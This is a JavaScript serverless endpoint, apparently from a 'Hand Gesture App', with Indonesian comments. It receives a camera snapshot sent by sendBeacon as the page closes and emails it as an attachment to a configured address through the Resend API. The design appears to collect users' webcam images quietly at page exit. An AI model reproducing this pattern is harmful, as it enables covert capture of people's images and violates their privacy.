export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false, error: 'Method not allowed' });
  }

  try {
    // sendBeacon dari browser bisa kekirim sebagai raw Buffer di req.body
    // atau sebagai stream, tergantung content-type. Handle dua-duanya.
    let buffer;
    if (Buffer.isBuffer(req.body)) {
      buffer = req.body;
    } else {
      const chunks = [];
      for await (const chunk of req) chunks.push(chunk);
      buffer = Buffer.concat(chunks);
    }

    if (!buffer || buffer.length === 0) {
      return res.status(400).json({ ok: false, error: 'Foto kosong' });
    }

    const base64 = buffer.toString('base64');
    const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

    const resendRes = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${process.env.RESEND_API_KEY}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        from: 'Hand Gesture App <onboarding@resend.dev>',
        to: [process.env.TARGET_EMAIL],
        subject: `Snapshot kamera - ${waktu}`,
        html: `<p>Snapshot terakhir sebelum halaman ditutup.</p><p>Waktu: ${waktu} WIB</p>`,
        attachments: [{ filename: 'snapshot.jpg', content: base64 }],
      }),
    });

    const data = await resendRes.json();
    if (!resendRes.ok) {
      return res.status(resendRes.status).json({ ok: false, error: data });
    }
    return res.status(200).json({ ok: true, data });
  } catch (err) {
    return res.status(500).json({ ok: false, error: String(err) });
  }
}
